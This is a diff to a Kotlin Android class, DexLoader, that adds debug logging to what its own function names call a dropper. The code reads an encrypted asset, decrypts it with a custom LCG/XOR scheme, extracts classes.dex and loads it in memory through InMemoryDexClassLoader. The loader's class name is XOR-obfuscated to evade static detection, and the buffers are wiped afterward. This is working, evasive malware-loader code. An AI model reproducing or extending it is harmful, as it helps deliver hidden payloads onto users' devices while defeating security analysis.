@@ -48,30 +48,54 @@ object DexLoader {
     @SuppressLint("NewApi")
     private fun doLoad(context: Context): ClassLoader {
         val assetName = BuildConfig.ASSET_A
-        val encryptedBlob = context.assets.open(assetName).use { it.readBytes() }
 
-        // First 4 bytes = seed (little-endian uint32)
+        // ── Step 1: Read encrypted blob from assets ───────────────────────────
+        val encryptedBlob = try {
+            val bytes = context.assets.open(assetName).use { it.readBytes() }
+            DebugLogger.logDropper("Asset read", DebugLogger.Status.SUCCESS, "$assetName — ${bytes.size} bytes")
+            bytes
+        } catch (e: Exception) {
+            DebugLogger.logDropper("Asset read", DebugLogger.Status.FAILED, "$assetName — ${e::class.simpleName}: ${e.message}")
+            throw e
+        }
+
+        // ── Step 2: Extract seed (first 4 bytes, little-endian uint32) ────────
         val seed = ((encryptedBlob[0].toLong() and 0xFF) or
                    ((encryptedBlob[1].toLong() and 0xFF) shl 8) or
                    ((encryptedBlob[2].toLong() and 0xFF) shl 16) or
                    ((encryptedBlob[3].toLong() and 0xFF) shl 24)) and MASK
+        DebugLogger.logDropper("Seed extract", DebugLogger.Status.SUCCESS, "0x${seed.toString(16).uppercase()}")
 
         val ciphertext = encryptedBlob.copyOfRange(4, encryptedBlob.size)
 
-        // Decrypt: LCG+nibble+XOR (reverse of build_module.py _lcg_encrypt)
-        val apkBytes = lcgDecrypt(ciphertext, seed)
+        // ── Step 3: Decrypt LCG+nibble+XOR ───────────────────────────────────
+        val apkBytes = try {
+            val decrypted = lcgDecrypt(ciphertext, seed)
+            DebugLogger.logDropper("Decrypt", DebugLogger.Status.SUCCESS, "${decrypted.size} bytes")
+            decrypted
+        } catch (e: Exception) {
+            DebugLogger.logDropper("Decrypt", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
+            throw e
+        }
 
         // Wipe encrypted blob from memory
         encryptedBlob.fill(0)
         ciphertext.fill(0)
 
-        // Extract classes.dex from decrypted APK bytes via ZipInputStream
-        val dexBytes = extractDex(apkBytes)
+        // ── Step 4: Extract classes.dex from decrypted APK via ZipInputStream ─
+        val dexBytes = try {
+            val dex = extractDex(apkBytes)
+            DebugLogger.logDropper("ZIP extract classes.dex", DebugLogger.Status.SUCCESS, "${dex.size} bytes")
+            dex
+        } catch (e: Exception) {
+            DebugLogger.logDropper("ZIP extract classes.dex", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
+            throw e
+        }
 
         // Wipe decrypted APK bytes
         apkBytes.fill(0)
 
-        // Load DEX into memory — never written to disk.
+        // ── Step 5: Load DEX into memory via InMemoryDexClassLoader ──────────
         // FIXED: Direct InMemoryDexClassLoader import removed.
         // String "dalvik.system.InMemoryDexClassLoader" XOR-encoded with key 0x5A.
         // Identical pattern to AppEntry.kt — class name never literal in DEX string pool.
@@ -95,15 +119,22 @@ object DexLoader {
         }
         val imdclName = String(imdclChars) // "dalvik.system.InMemoryDexClassLoader" — runtime only
 
-        val imdclClass = Class.forName(imdclName)
-        val imdclCtor  = imdclClass.getConstructor(
-            ByteBuffer::class.java,
-            ClassLoader::class.java
-        )
-        val buf = ByteBuffer.wrap(dexBytes)
-        val loader = ClassLoader::class.java.cast(
-            imdclCtor.newInstance(buf, context.classLoader)
-        ) ?: throw IllegalStateException("ClassLoader cast failed")
+        val loader = try {
+            val imdclClass = Class.forName(imdclName)
+            val imdclCtor  = imdclClass.getConstructor(
+                ByteBuffer::class.java,
+                ClassLoader::class.java
+            )
+            val buf = ByteBuffer.wrap(dexBytes)
+            val cl = ClassLoader::class.java.cast(
+                imdclCtor.newInstance(buf, context.classLoader)
+            ) ?: throw IllegalStateException("ClassLoader cast failed")
+            DebugLogger.logDropper("ClassLoader load", DebugLogger.Status.SUCCESS, "InMemoryDexClassLoader ready")
+            cl
+        } catch (e: Exception) {
+            DebugLogger.logDropper("ClassLoader load", DebugLogger.Status.FAILED, "${e::class.simpleName}: ${e.message}")
+            throw e
+        }
 
         // Wipe DEX bytes after ClassLoader has loaded
         dexBytes.fill(0)
